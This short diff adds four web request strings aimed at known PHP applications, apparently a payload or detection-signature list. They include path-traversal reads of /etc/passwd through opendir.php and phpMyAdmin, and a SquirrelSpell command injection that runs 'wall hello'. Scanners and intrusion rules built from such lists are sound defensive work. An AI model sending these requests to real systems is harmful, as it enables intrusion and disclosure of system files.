@@ -1,0 +1,4 @@
+cgi_bin.phpadmin/login
+opendir.phprequesturl=/etc/passwd
+phpmyadmin/sql.phpbtndrop=no&goto=/etc/passwd
+squirrelspell/modules/check_me.mod.phpsqspell_app[blah]=wall%20hello&sqspell_use_app=blah&attachment_dir=/tmp&username_sqspell_data=plik
